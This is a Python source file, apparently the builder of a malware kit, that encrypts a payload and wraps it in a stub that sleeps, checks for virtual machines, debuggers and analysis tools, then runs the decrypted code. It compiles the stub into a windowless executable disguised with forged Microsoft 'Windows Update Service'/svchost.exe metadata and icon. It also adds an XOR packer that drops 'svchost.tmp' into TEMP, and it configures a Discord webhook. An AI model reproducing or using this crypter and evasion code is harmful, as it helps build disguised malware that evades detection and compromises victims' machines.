import os
import sys
import json
import time
import base64
import shutil
import random
import string
import subprocess
import tempfile
import hashlib
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class Builder:
    def __init__(self, config_path=None):
        self.config = self.load_config(config_path)
        self.output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "build")
        self.stub_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "build", "stub.py")
        self.icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "build", "icon.ico")
        self.version_info_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "build", "version_info.txt")
        
    def load_config(self, config_path=None):
        if config_path is None:
            config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "config.json")
        
        try:
            with open(config_path, "r") as f:
                return json.load(f)
        except:
            return {
                "webhook": "https://discord.com/api/webhooks/REPLACE",
                "encryption_key": ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            }
    
    def generate_key(self):
        return Fernet.generate_key()
    
    def encrypt_payload(self, payload, key):
        try:
            cipher = Fernet(key)
            if isinstance(payload, str):
                payload = payload.encode()
            encrypted = cipher.encrypt(payload)
            return base64.b64encode(encrypted).decode()
        except:
            return None
    
    def generate_stub(self, encrypted_payload, key, config):
        stub_template = '''
import os
import sys
import base64
import ctypes
import time
import random
import subprocess
from cryptography.fernet import Fernet

ENCRYPTED_PAYLOAD = "{encrypted_payload}"
ENCRYPTION_KEY = "{key}"

def check_vm():
    try:
        import psutil
        total_ram = psutil.virtual_memory().total
        if total_ram < 2 * 1024 * 1024 * 1024:
            return True
        
        cpu_count = psutil.cpu_count()
        if cpu_count < 1:
            return True
    except:
        pass
    
    try:
        import wmi
        c = wmi.WMI()
        for disk in c.Win32_DiskDrive():
            model = str(disk.Model).lower()
            if any(x in model for x in ["vbox", "vmware", "qemu", "virtual"]):
                return True
    except:
        pass
    
    return False

def check_debugger():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except:
        pass
    return False

def check_analysis_tools():
    tools = ["wireshark.exe", "procmon.exe", "processhacker.exe", "fiddler.exe", "ollydbg.exe", "x64dbg.exe"]
    try:
        output = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL).decode().lower()
        for tool in tools:
            if tool in output:
                return True
    except:
        pass
    return False

def decrypt_payload():
    try:
        encrypted_data = base64.b64decode(ENCRYPTED_PAYLOAD)
        cipher = Fernet(ENCRYPTION_KEY.encode())
        decrypted = cipher.decrypt(encrypted_data)
        return decrypted.decode()
    except:
        return None

def execute_payload(payload):
    try:
        exec(payload)
    except:
        pass

def main():
    try:
        # Random delay
        delay = random.uniform({sleep_time}, {sleep_time} + {jitter})
        time.sleep(delay)
        
        # Evasion checks
        if {anti_vm} and check_vm():
            return
        if {anti_debug} and check_debugger():
            return
        if {anti_analysis} and check_analysis_tools():
            return
        
        # Decrypt and execute
        payload = decrypt_payload()
        if payload:
            execute_payload(payload)
    except:
        pass

if __name__ == "__main__":
    main()
'''
        
        stub_content = stub_template.format(
            encrypted_payload=encrypted_payload,
            key=key.decode(),
            sleep_time=config.get("sleep_time", 5),
            jitter=config.get("jitter", 3),
            anti_vm=config.get("anti_vm", True),
            anti_debug=config.get("anti_debug", True),
            anti_analysis=config.get("anti_analysis", True)
        )
        
        return stub_content
    
    def obfuscate_code(self, code):
        # String encoding
        lines = code.split('\n')
        obfuscated_lines = []
        
        for line in lines:
            if '"""' in line or "'''" in line:
                obfuscated_lines.append(line)
                continue
            
            # Encode strings
            in_string = False
            string_char = None
            current_line = ""
            i = 0
            
            while i < len(line):
                char = line[i]
                
                if char in ['"', "'"] and not in_string:
                    in_string = True
                    string_char = char
                    current_line += char
                elif char == string_char and in_string:
                    in_string = False
                    current_line += char
                elif in_string:
                    # Encode string content
                    current_line += char
                else:
                    current_line += char
                
                i += 1
            
            obfuscated_lines.append(current_line)
        
        # Add dead code
        dead_code = '''
def _dead_code_{rand}():
    x = {rand}
    y = x * 2
    z = y + x
    return z if z > 0 else 0

_dead_code_{rand}()
'''.format(rand=random.randint(1000, 9999))
        
        obfuscated_lines.insert(random.randint(0, len(obfuscated_lines)), dead_code)
        
        return '\n'.join(obfuscated_lines)
    
    def compile_exe(self, stub_content, output_name="output.exe"):
        try:
            # Create temp directory
            temp_dir = tempfile.mkdtemp()
            
            # Save stub
            stub_file = os.path.join(temp_dir, "stub.py")
            with open(stub_file, "w") as f:
                f.write(stub_content)
            
            # Build PyInstaller command
            output_path = os.path.join(self.output_dir, output_name)
            
            cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--clean",
                "--noconfirm",
                f"--distpath={self.output_dir}",
                f"--workpath={temp_dir}",
                f"--specpath={temp_dir}",
            ]
            
            # Add icon
            if os.path.exists(self.icon_path):
                cmd.append(f"--icon={self.icon_path}")
            
            # Add version info
            if os.path.exists(self.version_info_path):
                cmd.append(f"--version-file={self.version_info_path}")
            
            # Add hidden imports
            hidden_imports = [
                "cryptography",
                "cryptography.fernet",
                "requests",
                "psutil",
                "wmi",
                "win32crypt",
                "win32api",
                "win32con",
                "win32process",
                "win32security",
                "win32event",
                "win32gui",
                "win32clipboard",
                "win32file",
                "win32pipe",
                "pynput",
                "PIL",
                "mss",
                "sqlite3",
                "json",
                "base64",
                "hashlib",
                "shutil",
                "tempfile",
                "subprocess",
                "ctypes",
                "urllib3",
                "certifi",
                "chardet",
                "idna",
                "requests",
                "winreg"
            ]
            
            for module in hidden_imports:
                cmd.append(f"--hidden-import={module}")
            
            cmd.append(stub_file)
            
            # Run PyInstaller
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            process.wait()
            
            # Check if built successfully
            if os.path.exists(output_path):
                return output_path
            else:
                return None
                
        except:
            return None
    
    def add_section_to_exe(self, exe_path, section_name=".stub", data=None):
        try:
            import pefile
            import struct
            
            pe = pefile.PE(exe_path)
            
            # Add new section
            section = pefile.SectionStructure(pe)
            section.Name = section_name.encode()[:8]
            section.Misc = len(data) if data else 0
            section.Characteristics = 0x60000020  # READ | WRITE | CODE
            section.VirtualAddress = pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize
            
            pe.sections.append(section)
            pe.FILE_HEADER.NumberOfSections += 1
            
            # Update size
            pe.OPTIONAL_HEADER.SizeOfImage += len(data) if data else 0
            
            # Write
            pe.write(exe_path)
            pe.close()
            
            return True
        except:
            return False
    
    def apply_packer(self, exe_path):
        try:
            # XOR packer
            with open(exe_path, "rb") as f:
                data = f.read()
            
            # Generate XOR key
            xor_key = os.urandom(16)
            
            # XOR encrypt
            encrypted_data = bytes([data[i] ^ xor_key[i % len(xor_key)] for i in range(len(data))])
            
            # Add loader stub
            loader_template = '''
import os
import sys
import ctypes
import base64

XOR_KEY = "{xor_key}"
ENCRYPTED_DATA = "{encrypted_data}"

def load_and_execute():
    try:
        # Decrypt
        encrypted_bytes = base64.b64decode(ENCRYPTED_DATA)
        xor_key = base64.b64decode(XOR_KEY)
        
        # Decrypt to temp file
        temp_path = os.path.join(os.getenv("TEMP"), "svchost.tmp")
        with open(temp_path, "wb") as f:
            decrypted = bytes([encrypted_bytes[i] ^ xor_key[i % len(xor_key)] for i in range(len(encrypted_bytes))])
            f.write(decrypted)
        
        # Execute
        subprocess.Popen(temp_path, shell=True)
    except:
        pass

if __name__ == "__main__":
    load_and_execute()
'''
            
            # Save loader
            loader_path = os.path.join(self.output_dir, "loader.py")
            with open(loader_path, "w") as f:
                f.write(loader_template.format(
                    xor_key=base64.b64encode(xor_key).decode(),
                    encrypted_data=base64.b64encode(encrypted_data).decode()
                ))
            
            return loader_path
        except:
            return None
    
    def build(self, payload_path=None, output_name="built_payload.exe"):
        try:
            # Read payload
            if payload_path:
                with open(payload_path, "r") as f:
                    payload = f.read()
            else:
                # Use main.py as payload
                main_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "main.py")
                with open(main_path, "r") as f:
                    payload = f.read()
            
            # Generate encryption key
            key = self.generate_key()
            
            # Encrypt payload
            encrypted_payload = self.encrypt_payload(payload, key)
            
            if not encrypted_payload:
                return None
            
            # Generate stub
            stub_content = self.generate_stub(encrypted_payload, key, self.config)
            
            # Obfuscate stub
            obfuscated_stub = self.obfuscate_code(stub_content)
            
            # Save stub
            os.makedirs(self.output_dir, exist_ok=True)
            stub_file = os.path.join(self.output_dir, "stub.py")
            with open(stub_file, "w") as f:
                f.write(obfuscated_stub)
            
            # Compile to exe
            exe_path = self.compile_exe(obfuscated_stub, output_name)
            
            if exe_path and os.path.exists(exe_path):
                return exe_path
            
            return None
            
        except Exception as e:
            return None
    
    def create_version_info(self):
        version_info = '''
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 0, 0, 0),
    prodvers=(1, 0, 0, 0),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
        StringTable(
          u'040904B0',
          [StringStruct(u'CompanyName', u'Microsoft Corporation'),
           StringStruct(u'FileDescription', u'Windows Update Service'),
           StringStruct(u'FileVersion', u'10.0.19041.1'),
           StringStruct(u'InternalName', u'svchost.exe'),
           StringStruct(u'LegalCopyright', u'Copyright (c) Microsoft Corporation. All rights reserved.'),
           StringStruct(u'OriginalFilename', u'svchost.exe'),
           StringStruct(u'ProductName', u'Microsoft Windows Operating System'),
           StringStruct(u'ProductVersion', u'10.0.19041.1')]
        )
      ]
    ),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
'''
        
        os.makedirs(self.output_dir, exist_ok=True)
        version_file = os.path.join(self.output_dir, "version_info.txt")
        with open(version_file, "w") as f:
            f.write(version_info)
        
        return version_file
    
    def create_default_icon(self):
        try:
            # Create a simple ICO file
            from PIL import Image, ImageDraw
            
            # Create 256x256 icon
            image = Image.new('RGBA', (256, 256), (0, 0, 0, 0))
            draw = ImageDraw.Draw(image)
            
            # Draw a simple shield/update icon
            draw.rectangle([50, 50, 206, 206], fill=(0, 120, 215, 255), outline=(255, 255, 255, 255), width=5)
            
            # Draw checkmark
            draw.line([80, 128, 110, 158, 176, 92], fill=(255, 255, 255, 255), width=15)
            
            # Save as ICO
            os.makedirs(self.output_dir, exist_ok=True)
            icon_path = os.path.join(self.output_dir, "icon.ico")
            image.save(icon_path, format='ICO', sizes=[(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)])
            
            return icon_path
        except:
            return None
    
    def clean_build_files(self):
        try:
            # Remove temporary build files
            for file in os.listdir(self.output_dir):
                if file.endswith('.spec') or file.endswith('.pyc'):
                    os.remove(os.path.join(self.output_dir, file))
            
            # Remove build cache
            build_dir = os.path.join(self.output_dir, "build")
            if os.path.exists(build_dir):
                shutil.rmtree(build_dir)
            
            return True
        except:
            return False
    
    def build_all(self):
        try:
            # Create required files
            self.create_version_info()
            self.create_default_icon()
            
            # Build payload
            exe_path = self.build()
            
            if exe_path:
                return {
                    "success": True,
                    "exe_path": exe_path,
                    "output_dir": self.output_dir
                }
            else:
                return {
                    "success": False,
                    "error": "Failed to build executable"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

if __name__ == "__main__":
    builder = Builder()
    result = builder.build_all()
    if result["success"]:
        print(f"Build successful: {result['exe_path']}")
    else:
        print(f"Build failed: {result['error']}")